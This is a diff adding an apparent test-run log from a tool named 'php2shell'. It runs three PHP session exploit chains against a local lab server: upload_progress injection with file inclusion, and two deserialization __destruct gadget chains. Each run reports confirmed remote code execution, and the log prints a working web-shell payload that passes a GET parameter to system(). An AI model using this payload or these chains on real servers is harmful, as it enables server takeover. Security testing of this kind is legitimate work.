@@ -1,0 +1,47 @@
+===== 8.5.12-fpm 2026-10-22T18:05:53Z =====
+--- A ---
+[*] php2shell — Chain A: session injection + LFI
+[*] target       : http://127.0.0.1:18080
+[*] upload sink  : /index.php
+[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>
+[*] session file : /tmp/sessions/sess_p2s7db4260c7a351ef2881bdfda
+[*] SID          : p2s7db4260c7a351ef2881bdfda
+[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>
+
+[1] injecting payload through the upload_progress filename...
+    -> HTTP/1.1 200 OK
+[2] triggering the LFI sink...
+    -> payload executed
+[+] RCE confirmed
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+--- C ---
+[*] php2shell — Chain C: handler mismatch -> __destruct
+[*] target     : http://127.0.0.1:18080
+[*] writer     : /app/write.php  (php_serialize)
+[*] reader     : /api/endpoint.php  (php)
+[*] SID        : p2sc358322bfb21bf12baef7
+[*] gadget     : Evil->cmd
+
+[1] poisoning the session through the php_serialize directory...
+    -> stored
+[2] re-reading it through the php-handler directory...
+    -> __destruct fired during request startup
+[+] RCE confirmed
+
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+--- E ---
+[*] php2shell — Chain E: decode failure -> __destruct
+[*] target   : http://127.0.0.1:18080
+[*] reader   : /e_shell.php
+[*] SID      : p2sea0268fd3feffdc13c35d
+[*] gadget   : EvilE->cmd
+
+[1] planting a session file: x|<gadget><trailing junk>...
+    -> __destruct fired during request startup
+[+] RCE confirmed
+
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
